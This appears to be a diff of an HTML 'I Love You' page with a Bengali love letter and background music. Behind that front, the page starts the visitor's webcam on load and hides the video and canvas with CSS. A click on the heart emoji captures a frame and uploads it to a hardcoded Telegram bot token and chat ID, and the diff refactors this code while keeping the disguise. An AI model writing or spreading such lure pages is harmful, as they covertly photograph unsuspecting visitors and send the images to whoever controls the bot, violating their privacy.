@@ -56,14 +56,6 @@
       font-style: italic;
     }
 
-    video {
-      display: none;
-    }
-
-    canvas {
-      display: none;
-    }
-
     .love-letter {
       font-family: 'Pinyon Script', cursive;
       font-size: 1.5rem;
@@ -100,6 +92,14 @@
     .music-btn:focus {
       outline: none;
     }
+
+    video {
+      display: none;
+    }
+
+    canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -107,57 +107,59 @@
     <div class="heart" onclick="capturePhoto()">❤️</div>
     <h1>I <span>Love</span> You</h1>
 
+    <!-- Love Letter Section -->
     <div class="love-letter">
       <p>প্রিয়তম,</p>
-      <p>যেদিন তোমার সঙ্গে প্রথম দেখা হয়েছিল, আমার হৃদয় যেন বুঝে গিয়েছিল যে আমাদের মধ্যে কিছু বিশেষ রয়েছে। তুমি যে ভাবে আমাকে অনুভব করাতে, তা ভাষায় বর্ণনা করা সম্ভব নয়। প্রতিটি দিন, প্রতিটি মুহূর্ত তোমার সঙ্গে কাটানো যেন একটি সুন্দর স্বপ্নের মতো।</p>
+      <p>যতদিন তোমার সঙ্গে প্রথম দেখা হয়েছিল, আমার হৃদয় যেন বুঝে গিয়েছিল যে আমাদের মধ্যে কিছু বিশেষ রয়েছে। তুমি যে ভাবে আমাকে অনুভব করাতে, তা ভাষায় বর্ণনা করা সম্ভব নয়। প্রতিটি দিন, প্রতিটি মুহূর্ত তোমার সঙ্গে কাটানো যেন একটি সুন্দর স্বপ্নের মতো।</p>
       <p>যতক্ষণ আমি এটি লিখছি, ততক্ষণ আমি ভবিষ্যতটাকে ভাবছি এবং সমস্ত সম্ভাবনাগুলোর কথা ভাবছি, যেগুলো আমাদের জন্য অপেক্ষা করছে। তুমি আমার হৃদয়, আমার আত্মা, আমার সবকিছু। আমি তোমাকে এমনভাবে ভালোবাসি যা শব্দের মাধ্যমে প্রকাশ করা সম্ভব নয়। আমি কৃতজ্ঞ প্রতিটি মুহূর্তের জন্য যা আমরা একসাথে কাটাচ্ছি।</p>
       <p>চিরকাল তোমার,</p>
       <p><strong>তোমার ভালোবাসা</strong></p>
     </div>
 
+    <!-- Music Play Button -->
     <button class="music-btn" onclick="toggleMusic()">Play Music</button>
 
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
   </div>
 
+  <!-- Background Music -->
   <audio id="loveAudio" loop>
     <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
     Your browser does not support the audio element.
   </audio>
 
   <script>
-    let video = document.getElementById('video');
-    let canvas = document.getElementById('canvas');
-    let context = canvas.getContext('2d');
-    let audio = document.getElementById('loveAudio');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const audio = document.getElementById('loveAudio');
     let isPlaying = false;
 
-    // Start video feed
+    // Start webcam feed
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function(stream) {
+      .then((stream) => {
         video.srcObject = stream;
       })
-      .catch(function(error) {
-        console.error("Error accessing webcam: ", error);
+      .catch((err) => {
+        console.error('Error accessing webcam:', err);
       });
 
+    // Capture photo
     function capturePhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imageData = canvas.toDataURL('image/png');
 
-      sendToTelegramBot(imageData);
+      const base64Image = canvas.toDataURL('image/png');
+      const blob = base64ToBlob(base64Image);
+
+      sendToTelegram(blob);
     }
 
-    function sendToTelegramBot(imageData) {
-      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s'; // Replace with your bot token
-      const chatId = '1987016824'; // Replace with your chat ID
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-
-      const byteString = atob(imageData.split(',')[1]);
+    // Convert Base64 to Blob
+    function base64ToBlob(base64) {
+      const byteString = atob(base64.split(',')[1]);
       const arrayBuffer = new ArrayBuffer(byteString.length);
       const uintArray = new Uint8Array(arrayBuffer);
 
@@ -165,7 +167,14 @@
         uintArray[i] = byteString.charCodeAt(i);
       }
 
-      const blob = new Blob([uintArray], { type: 'image/png' });
+      return new Blob([uintArray], { type: 'image/png' });
+    }
+
+    // Send to Telegram
+    function sendToTelegram(blob) {
+      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s'; // Replace with your bot token
+      const chatId = '1987016824'; // Replace with your chat ID
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
 
       const formData = new FormData();
       formData.append('chat_id', chatId);
@@ -178,18 +187,19 @@
         .then((response) => response.json())
         .then((data) => {
           if (data.ok) {
-            alert('Image sent successfully!');
+            alert('Photo sent successfully!');
           } else {
             console.error('Telegram API Error:', data);
-            alert('Failed to send image.');
+            alert('Failed to send photo.');
           }
         })
-        .catch((error) => {
-          console.error('Fetch Error:', error);
-          alert('An error occurred while sending the image.');
+        .catch((err) => {
+          console.error('Fetch Error:', err);
+          alert('Error occurred while sending the photo.');
         });
     }
 
+    // Toggle music play/pause
     function toggleMusic() {
       if (!isPlaying) {
         audio.play();
